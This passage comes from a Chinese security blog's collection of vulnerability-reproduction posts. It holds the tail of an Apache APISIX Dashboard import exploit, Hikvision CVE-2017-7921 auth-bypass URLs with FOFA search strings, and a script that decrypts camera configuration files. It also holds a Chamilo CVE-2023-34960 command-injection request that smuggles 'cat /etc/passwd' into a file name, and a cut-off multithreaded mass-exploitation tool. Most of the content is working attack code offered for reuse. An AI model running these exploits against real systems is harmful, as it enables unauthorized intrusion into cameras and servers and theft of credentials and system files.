class="string">&quot;/apisix/admin/migrate/export&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text[:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_data</span>(<span class="params">url, data</span>):</span></span><br><span class="line">    data = json.dumps(data).encode()</span><br><span class="line">    crc32 = calc_crc(data)</span><br><span class="line"></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;data&quot;</span>, data + crc32, <span class="string">&quot;text/data&quot;</span>)&#125;</span><br><span class="line">    resp = requests.post(url + <span class="string">&quot;/apisix/admin/migrate/import&quot;</span>, files=files, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(resp.text)</span></span><br><span class="line">    <span class="keyword">if</span> resp.json().get(<span class="string">&quot;code&quot;</span>, -<span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; http://127.0.0.1:9000&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    </span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        url = url[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    uri = random_str()</span><br><span class="line">    eval_config[<span class="string">&quot;Routes&quot;</span>][<span class="number">0</span>][<span class="string">&quot;uris&quot;</span>] = [ <span class="string">&quot;/&quot;</span> + uri]</span><br><span class="line">    eval_config[<span class="string">&quot;Routes&quot;</span>][<span class="number">0</span>][<span class="string">&quot;name&quot;</span>] = uri</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> import_data(url, eval_config):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;attack success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uri is: &quot;</span> + <span class="string">&quot;/&quot;</span> + uri)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;attack error&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】CVE-2017-7921 海康威视（Hikvision）摄像头漏洞复现</title>
    <url>/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%EF%BC%88Hikvision%EF%BC%89%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="【漏洞复现】CVE-2017-7921-海康威视（Hikvision）摄像头漏洞复现"><a href="#【漏洞复现】CVE-2017-7921-海康威视（Hikvision）摄像头漏洞复现" class="headerlink" title="【漏洞复现】CVE-2017-7921 海康威视（Hikvision）摄像头漏洞复现"></a>【漏洞复现】CVE-2017-7921 海康威视（Hikvision）摄像头漏洞复现</h1><p>之前渗透到时候碰到了，记录一个复现文章。</p>
<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>通过构造url进行检索所有用户、屏幕截图、配置文件下载</p>
<h1 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h1><p><code>app=&quot;HIKVISION-视频监控&quot;</code></p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HikvisionDS-2CD2xx2F-ISeries5.2.0build140721</span><br><span class="line">版本至5.4.0build160530版本；</span><br><span class="line"></span><br><span class="line">DS-2CD2xx0F-ISeries5.2.0build140721</span><br><span class="line">版本至5.4.0Build160401版本；</span><br><span class="line"></span><br><span class="line">DS-2CD2xx2FWDSeries5.3.1build150410</span><br><span class="line">版本至5.4.4Build161125版本；</span><br><span class="line"></span><br><span class="line">DS-2CD4x2xFWDSeries5.2.0build140721</span><br><span class="line">版本至5.4.0Build160414版本；</span><br><span class="line"></span><br><span class="line">DS-2CD4xx5Series5.2.0build140721</span><br><span class="line">版本至5.4.0Build160421版本；</span><br><span class="line"></span><br><span class="line">DS-2DFxSeries5.2.0build140805</span><br><span class="line">版本至5.4.5Build160928版本；</span><br><span class="line"></span><br><span class="line">DS-2CD63xxSeries5.0.9build140305</span><br><span class="line">版本至5.3.5Build160106版本</span><br></pre></td></tr></table></figure>

<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>在web浏览器中输入以下代码来检索用户与用户列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://目的IP地址/Security/users?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line">&lt;UserList xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot; version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;User xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot; version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;id&gt;1&lt;/id&gt;</span><br><span class="line">&lt;userName&gt;admin&lt;/userName&gt;</span><br><span class="line">&lt;priority&gt;high&lt;/priority&gt;</span><br><span class="line">&lt;ipAddress&gt;0.0.0.0&lt;/ipAddress&gt;</span><br><span class="line">&lt;macAddress&gt;00:00:00:00:00:00&lt;/macAddress&gt;</span><br><span class="line">&lt;userLevel&gt;Administrator&lt;/userLevel&gt;</span><br><span class="line">&lt;/User&gt;</span><br><span class="line">&lt;/UserList&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在没有进行身份验证的情况下获取监控快照可以使用以下代码在浏览器中打开<br><code>http://目的IP地址/onvif-http/snapshot?auth=YWRtaW46MTEK</code></p>
<p>在没有验证的情况下需要使用如下代码来下载摄像头的配置文件<br><code>http://目的IP地址/System/configurationFile?auth=YWRtaW46MTEK</code><br>代码输入之后浏览器会自动下载一个名为configurationFile的文件，如下</p>
<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%EF%BC%88Hikvision%EF%BC%89%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230415153217226.png" alt="image-20230415153217226"></p>
<p>之后用大佬的脚本解密此文件即可</p>
<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2017-7921-%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%EF%BC%88Hikvision%EF%BC%89%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230415153327440.png" alt="image-20230415153327440"></p>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p><a href="https://pan.baidu.com/s/1sMV0kCeqv7mHD0BHB3qEDw">https://pan.baidu.com/s/1sMV0kCeqv7mHD0BHB3qEDw</a></p>
<p>提取码：peak</p>
<p>我这里也放出来，免得链接挂了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(s) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        s += <span class="string">b&#x27;\0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> s </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext, hex_key=<span class="string">&#x27;279977f62f6cfd2d91cd75b889ce0c9a&#x27;</span></span>):</span></span><br><span class="line">    key = <span class="built_in">bytes</span>.fromhex(hex_key)</span><br><span class="line">    ciphertext = add_to_16(ciphertext)</span><br><span class="line">    <span class="comment">#iv = ciphertext[:AES.block_size]</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext[AES.block_size:])</span><br><span class="line">    <span class="keyword">return</span> plaintext.rstrip(<span class="string">b&quot;\0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xore</span>(<span class="params">data, key=<span class="built_in">bytearray</span>(<span class="params">[<span class="number">0x73</span>, <span class="number">0x8B</span>, <span class="number">0x55</span>, <span class="number">0x44</span>]</span>)</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(data, cycle(key)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strings</span>(<span class="params">file</span>):</span></span><br><span class="line">    chars = <span class="string">r&quot;A-Za-z0-9/\-:.,_$%&#x27;()[\]&lt;&gt; &quot;</span></span><br><span class="line">    shortestReturnChar = <span class="number">2</span></span><br><span class="line">    regExp = <span class="string">&#x27;[%s]&#123;%d,&#125;&#x27;</span> % (chars, shortestReturnChar)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(regExp)</span><br><span class="line">    <span class="keyword">return</span> pattern.findall(file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(sys.argv[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">f&#x27;No valid config file provided to decrypt. For example:\n<span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;configfile&gt;&#x27;</span>)</span><br><span class="line">    xor = xore( decrypt(<span class="built_in">open</span>( sys.argv[<span class="number">1</span>],<span class="string">&#x27;rb&#x27;</span>).read()) )</span><br><span class="line">    result_list = strings(xor.decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(result_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】CVE-2023-34960-Chamilo</title>
    <url>/2023/08/11/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2023-34960-Chamilo/</url>
    <content><![CDATA[<h1 id="【漏洞复现】CVE-2023-34960-Chamilo"><a href="#【漏洞复现】CVE-2023-34960-Chamilo" class="headerlink" title="【漏洞复现】CVE-2023-34960-Chamilo"></a>【漏洞复现】CVE-2023-34960-Chamilo</h1><h1 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h1><p><a href="https://github.com/Pari-Malam/CVE-2023-34960">https://github.com/Pari-Malam/CVE-2023-34960</a></p>
<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Chamilo 是一个电子学习平台，也称为学习管理系统 （LMS）。Chamilo additional_webservices.php存在命令执行漏洞。</p>
<h1 id="fofa指纹"><a href="#fofa指纹" class="headerlink" title="fofa指纹"></a>fofa指纹</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Chamilo&quot;</span><br></pre></td></tr></table></figure>

<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>Chamilo &lt;=1.11.18</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="/2023/08/11/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2023-34960-Chamilo/image-20230811194649111.png" alt="image-20230811194649111"></p>
<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /main/webservices/additional_webservices.php HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 880</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://mail.cosecadvirtual.com&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:ns2=&quot;http://xml.apache.org/xml-soap&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:wsConvertPpt&gt;&lt;param0 xsi:type=&quot;ns2:Map&quot;&gt;&lt;item&gt;&lt;key xsi:type=&quot;xsd:string&quot;&gt;file_data&lt;/key&gt;&lt;value xsi:type=&quot;xsd:string&quot;&gt;&lt;/value&gt;&lt;/item&gt;&lt;item&gt;&lt;key xsi:type=&quot;xsd:string&quot;&gt;file_name&lt;/key&gt;&lt;value xsi:type=&quot;xsd:string&quot;&gt;`&#123;&#125;`.pptx&#x27;|&quot; |cat /etc/passwd||a #&lt;/value&gt;&lt;/item&gt;&lt;item&gt;&lt;key xsi:type=&quot;xsd:string&quot;&gt;service_ppt2lp_size&lt;/key&gt;&lt;value xsi:type=&quot;xsd:string&quot;&gt;720x540&lt;/value&gt;&lt;/item&gt;&lt;/param0&gt;&lt;/ns1:wsConvertPpt&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>



<h1 id="工具备份"><a href="#工具备份" class="headerlink" title="工具备份"></a>工具备份</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: Pari Malam</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, Style</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">FY = Fore.YELLOW</span><br><span class="line">FG = Fore.GREEN</span><br><span class="line">FR = Fore.RED</span><br><span class="line">FC = Fore.CYAN</span><br><span class="line">FW = Fore.WHITE</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span></span><br><span class="line">    os.system(<span class="string">&#x27;clear&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;posix&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;Results&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;Results&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banners</span>():</span></span><br><span class="line">    clear()</span><br><span class="line">    stdout.write(<span class="string">&quot;                                                                                         \n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.LIGHTRED_EX +<span class="string">&quot;╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.YELLOW +<span class="string">&quot;═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.YELLOW   +<span class="string">&quot;╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.YELLOW   +<span class="string">&quot;║ \x1b[38;2;255;20;147m• &quot;</span>+Fore.GREEN+<span class="string">&quot;AUTHOR             &quot;</span>+Fore.RED+<span class="string">&quot;    |&quot;</span>+Fore.LIGHTWHITE_EX+<span class="string">&quot;   PARI MALAM                                    &quot;</span>+Fore.YELLOW+<span class="string">&quot;║\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.YELLOW   +<span class="string">&quot;╔════════════════════════════════════════════════════════════════════════════╝\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.YELLOW   +<span class="string">&quot;║ \x1b[38;2;255;20;147m• &quot;</span>+Fore.GREEN+<span class="string">&quot;GITHUB             &quot;</span>+Fore.RED+<span class="string">&quot;    |&quot;</span>+Fore.LIGHTWHITE_EX+<span class="string">&quot;   GITHUB.COM/PARI-MALAM                         &quot;</span>+Fore.YELLOW+<span class="string">&quot;║\n&quot;</span>)</span><br><span class="line">    stdout.write(<span class="string">&quot;&quot;</span>+Fore.YELLOW   +<span class="string">&quot;╚════════════════════════════════════════════════════════════════════════════╝\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;FY&#125;</span>[CVE-2023-34960] - <span class="subst">&#123;FG&#125;</span>Unauthenticated Command Injection\n<span class="subst">&#123;Style.RESET_ALL&#125;</span>&quot;</span>)</span><br><span class="line">banners()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">users_agents</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lib/ua.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> ua_file:</span><br><span class="line">        user_agents = ua_file.readlines()</span><br><span class="line">    user_agents = [ua.strip() <span class="keyword">for</span> ua <span class="keyword">in</span> user_agents <span class="keyword">if</span> ua.strip()]</span><br><span class="line">    <span class="keyword">return</span> user_agents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chamilo</span>(<span class="params">url, command, user_agents</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + url.strip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    body = <span class="string">f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;<span class="subst">&#123;url&#125;</span>&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:ns2=&quot;http://xml.apache.org/xml-soap&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;SOAP-ENV:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;ns1:wsConvertPpt&gt;</span></span><br><span class="line"><span class="string">            &lt;param0 xsi:type=&quot;ns2:Map&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;item&gt;</span></span><br><span class="line"><span class="string">                    &lt;key xsi:type=&quot;xsd:string&quot;&gt;file_data&lt;/key&gt;</span></span><br><span class="line"><span class="string">                    &lt;value xsi:type=&quot;xsd:string&quot;&gt;&lt;/value&gt;</span></span><br><span class="line"><span class="string">                &lt;/item&gt;</span></span><br><span class="line"><span class="string">                &lt;item&gt;</span></span><br><span class="line"><span class="string">                    &lt;key xsi:type=&quot;xsd:string&quot;&gt;file_name&lt;/key&gt;</span></span><br><span class="line"><span class="string">                    &lt;value xsi:type=&quot;xsd:string&quot;&gt;`&#123;&#123;&#125;&#125;`.pptx&#x27;|&quot; |<span class="subst">&#123;command&#125;</span>||a #&lt;/value&gt;</span></span><br><span class="line"><span class="string">                &lt;/item&gt;</span></span><br><span class="line"><span class="string">                &lt;item&gt;</span></span><br><span class="line"><span class="string">                    &lt;key xsi:type=&quot;xsd:string&quot;&gt;service_ppt2lp_size&lt;/key&gt;</span></span><br><span class="line"><span class="string">                    &lt;value xsi:type=&quot;xsd:string&quot;&gt;720x540&lt;/value&gt;</span></span><br><span class="line"><span class="string">                &lt;/item&gt;</span></span><br><span class="line"><span class="string">            &lt;/param0&gt;</span></span><br><span class="line"><span class="string">        &lt;/ns1:wsConvertPpt&gt;</span></span><br><span class="line"><span class="string">    &lt;/SOAP-ENV:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/SOAP-ENV:Envelope&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span>, <span class="string">&#x27;User-Agent&#x27;</span>: random.choice(user_agents)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/main/webservices/additional_webservices.php&#x27;</span>, data=body, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;FY&#125;</span>[CVE-2023-34960] - <span class="subst">&#123;FW&#125;</span><span class="subst">&#123;url&#125;</span> - <span class="subst">&#123;FR&#125;</span>[Failed!] - <span class="subst">&#123;FC&#125;</span>Invalid <span class="subst">&#123;Style.RESET_ALL&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwned = ET.fromstring(r.text)</span><br><span class="line">        <span class="keyword">except</span> ET.ParseError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;FY&#125;</span>[CVE-2023-34960] - <span class="subst">&#123;FW&#125;</span><span class="subst">&#123;url&#125;</span> - <span class="subst">&#123;FR&#125;</span>[Failed!] - <span class="subst">&#123;FC&#125;</span>Invalid XML Response<span class="subst">&#123;Style.RESET_ALL&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        tagged = pwned.find(<span class="string">&#x27;.//return&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tagged <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            content = tagged.text</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;FY&#125;</span>[CVE-2023-34960] - <span class="subst">&#123;FW&#125;</span><span class="subst">&#123;url&#125;</span> - <span class="subst">&#123;FG&#125;</span>[w00t!] - <span class="subst">&#123;FC&#125;</span>Vulnerable: <span class="subst">&#123;FW&#125;</span><span class="subst">&#123;content&#125;</span><span class="subst">&#123;Style.RESET_ALL&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;FY&#125;</span>[CVE-2023-34960] - <span class="subst">&#123;FW&#125;</span><span class="subst">&#123;url&#125;</span> - <span class="subst">&#123;FR&#125;</span>[Failed!] - <span class="subst">&#123;FC&#125;</span>Not found on execution. Check manually.<span class="subst">&#123;Style.RESET_ALL&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;URL address (without &#x27;http://&#x27; prefix)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--filename&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;File containing URLs&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--command&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Command to execute (optional)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10</span>, <span class="built_in">help</span>=<span class="string">&quot;Maximum number of concurrent threads&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Output file for saving the results&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    command = args.command <span class="keyword">or</span> <span class="string">&#x27;uname -a&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.filename:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.filename, <span 